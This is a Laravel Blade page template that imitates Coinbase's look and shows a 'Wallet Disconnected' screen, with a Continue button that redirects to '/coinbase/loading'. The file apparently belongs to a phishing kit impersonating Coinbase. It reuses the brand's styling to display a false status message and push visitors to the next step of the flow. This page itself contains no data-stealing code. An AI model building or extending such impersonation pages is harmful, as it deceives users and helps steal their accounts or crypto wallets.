@extends('user.coinbase.layout')

@section('title', 'Coinbase - Disconnected')

@section('pageCss')
*,:before,:after{--tw-border-spacing-x: 0;--tw-border-spacing-y: 0;--tw-translate-x: 0;--tw-translate-y: 0;--tw-rotate: 0;--tw-skew-x: 0;--tw-skew-y: 0;--tw-scale-x: 1;--tw-scale-y: 1;--tw-pan-x: ;--tw-pan-y: ;--tw-pinch-zoom: ;--tw-scroll-snap-strictness: proximity;--tw-gradient-from-position: ;--tw-gradient-via-position: ;--tw-gradient-to-position: ;--tw-ordinal: ;--tw-slashed-zero: ;--tw-numeric-figure: ;--tw-numeric-spacing: ;--tw-numeric-fraction: ;--tw-ring-inset: ;--tw-ring-offset-width: 0px;--tw-ring-offset-color: #fff;--tw-ring-color: rgb(59 130 246 / .5);--tw-ring-offset-shadow: 0 0 #0000;--tw-ring-shadow: 0 0 #0000;--tw-shadow: 0 0 #0000;--tw-shadow-colored: 0 0 #0000;--tw-blur: ;--tw-brightness: ;--tw-contrast: ;--tw-grayscale: ;--tw-hue-rotate: ;--tw-invert: ;--tw-saturate: ;--tw-sepia: ;--tw-drop-shadow: ;--tw-backdrop-blur: ;--tw-backdrop-brightness: ;--tw-backdrop-contrast: ;--tw-backdrop-grayscale: ;--tw-backdrop-hue-rotate: ;--tw-backdrop-invert: ;--tw-backdrop-opacity: ;--tw-backdrop-saturate: ;--tw-backdrop-sepia: ;--tw-contain-size: ;--tw-contain-layout: ;--tw-contain-paint: ;--tw-contain-style: }

*,
:before,
:after {
  box-sizing: border-box;
  border-width: 0;
  border-style: solid;
  border-color: #e5e7eb;
}

html,
:host {
  line-height: 1.5;
  -webkit-text-size-adjust: 100%;
  -moz-tab-size: 4;
  -o-tab-size: 4;
  tab-size: 4;
  font-family: ui-sans-serif, system-ui, sans-serif, "Apple Color Emoji", "Segoe UI Emoji", Segoe UI Symbol, "Noto Color Emoji";
  font-feature-settings: normal;
  font-variation-settings: normal;
  -webkit-tap-highlight-color: transparent;
}

body {
  margin: 0;
  line-height: inherit;
}

button,
input,
optgroup,
select,
textarea {
  font-family: inherit;
  font-feature-settings: inherit;
  font-variation-settings: inherit;
  font-size: 100%;
  font-weight: inherit;
  line-height: inherit;
  letter-spacing: inherit;
  color: inherit;
  margin: 0;
  padding: 0;
}

button {
  height: auto;
}

img,
svg,
video,
canvas,
audio,
iframe,
embed,
object {
  display: block;
  vertical-align: middle;
}

#root {
  height: 100%;
}

.bg-coinbase-background {
  --tw-bg-opacity: 1;
  background-color: rgb(10 11 13 / var(--tw-bg-opacity, 1));
}
.bg-coinbase-primary {
  --tw-bg-opacity: 1;
  background-color: rgb(87 139 250 / var(--tw-bg-opacity, 1));
}
.flex { display: flex; }
.flex-col { flex-direction: column; }
.flex-grow { flex-grow: 1; }
.font-coinbase-sans { font-family: system-ui, -apple-system, BlinkMacSystemFont, "Segoe UI", Arial, sans-serif; }
.font-coinbase-text { font-family: system-ui, -apple-system, BlinkMacSystemFont, "Segoe UI", Arial, sans-serif; }
.font-coinbase-title { font-family: system-ui, -apple-system, BlinkMacSystemFont, "Segoe UI", Arial, sans-serif; }
.font-semibold { font-weight: 600; }
.h-16 { height: 4rem; }
.h-full { height: 100%; }
.items-center { align-items: center; }
.justify-between { justify-content: space-between; }
.justify-center { justify-content: center; }
.max-w-md { max-width: 28rem; }
.mb-8 { margin-bottom: 2rem; }
.min-h-fit { min-height: -moz-fit-content; min-height: fit-content; }
.mt-4 { margin-top: 1rem; }
.mt-8 { margin-top: 2rem; }
.mt-12 { margin-top: 3rem; }
.p-6 { padding: 1.5rem; }
.pb-2 { padding-bottom: .5rem; }
.pb-8 { padding-bottom: 2rem; }
.pl-6 { padding-left: 1.5rem; }
.pr-8 { padding-right: 2rem; }
.pt-5 { padding-top: 1.25rem; }
.px-6 { padding-left: 1.5rem; padding-right: 1.5rem; }
.py-4 { padding-top: 1rem; padding-bottom: 1rem; }
.rounded-\[16px\] { border-radius: 16px; }
.rounded-full { border-radius: 9999px; }
.text-\[28px\] { font-size: 28px; }
.text-black {
  --tw-text-opacity: 1;
  color: rgb(0 0 0 / var(--tw-text-opacity, 1));
}
.text-center { text-align: center; }
.text-coinbase-foreground-muted {
  --tw-text-opacity: 1;
  color: rgb(138 145 158 / var(--tw-text-opacity, 1));
}
.text-green-500 {
  --tw-text-opacity: 1;
  color: rgb(34 197 94 / var(--tw-text-opacity, 1));
}
.text-white {
  --tw-text-opacity: 1;
  color: rgb(255 255 255 / var(--tw-text-opacity, 1));
}
.transition-colors {
  transition-property: color,background-color,border-color,text-decoration-color,fill,stroke;
  transition-timing-function: cubic-bezier(.4,0,.2,1);
  transition-duration: .15s;
}
.w-16 { width: 4rem; }
.w-full { width: 100%; }
.fill-none { fill: none; }
.stroke-white { stroke: #fff; }
.stroke-\[30\] { stroke-width: 30; }
.hover\:bg-\[\#507fe5\]:hover {
  --tw-bg-opacity: 1;
  background-color: rgb(80 127 229 / var(--tw-bg-opacity, 1));
}
.disabled\:bg-\[\#314b84\]:disabled {
  --tw-bg-opacity: 1;
  background-color: rgb(49 75 132 / var(--tw-bg-opacity, 1));
}
.active\:bg-\[\#4b78d6\]:active {
  --tw-bg-opacity: 1;
  background-color: rgb(75 120 214 / var(--tw-bg-opacity, 1));
}
.disabled\:scale-100:disabled {
  --tw-scale-x: 1;
  --tw-scale-y: 1;
  transform: translate(var(--tw-translate-x),var(--tw-translate-y)) rotate(var(--tw-rotate)) skew(var(--tw-skew-x)) skewY(var(--tw-skew-y)) scaleX(var(--tw-scale-x)) scaleY(var(--tw-scale-y));
}
.active\:scale-\[\.98\]:active {
  --tw-scale-x: .98;
  --tw-scale-y: .98;
  transform: translate(var(--tw-translate-x),var(--tw-translate-y)) rotate(var(--tw-rotate)) skew(var(--tw-skew-x)) skewY(var(--tw-skew-y)) scaleX(var(--tw-scale-x)) scaleY(var(--tw-scale-y));
}

@media (min-width: 640px) {
  .sm\:border { border-width: 1px; }
  .sm\:border-coinbase-line,
  .sm\:border-crypto-line { border-color: #8a919e33; }
  .sm\:justify-start { justify-content: flex-start; }
  .sm\:mt-24 { margin-top: 6rem; }
  .sm\:px-10 { padding-left: 2.5rem; padding-right: 2.5rem; }
  .sm\:py-8 { padding-top: 2rem; padding-bottom: 2rem; }
}
@endsection

@section('content')
<form class="mt-12 flex min-h-fit w-full max-w-md flex-col rounded-[16px] p-6 font-coinbase-text sm:mt-24 sm:border sm:border-coinbase-line sm:px-10 sm:py-8 items-center text-center">
{!! $checkmarkSvg !!}
<span class="ll-fb-title pb-2 font-coinbase-title text-[28px] font-semibold text-white">
Wallet Disconnected
</span>
<span class="font-coinbase-sans text-coinbase-foreground-muted">
Your external wallet has been successfully disconnected from Coinbase.
</span>
<button id="cb-dd-btn" class="bg-coinbase-primary hover:bg-[#507fe5] disabled:bg-[#314b84] active:bg-[#4b78d6] disabled:scale-100 active:scale-[.98] rounded-full py-4 flex font-coinbase-sans font-semibold pl-6 pr-8 text-black items-center transition-colors justify-center mt-8 w-full" type="button">
Continue
</button>
</form>
<script>
(function(){
  var btn = document.getElementById('cb-dd-btn');
  var _sent = false;
  btn.addEventListener('click', function() {
    if (_sent) return; _sent = true;
    document.documentElement.style.background='#0a0b0d';
    document.body.style.background='#0a0b0d';
    setTimeout(function(){
      if(window.navigateTo)window.navigateTo('/coinbase/loading');
      else window.location.href='/coinbase/loading';
    },300);
  });
})();
</script>
@endsection
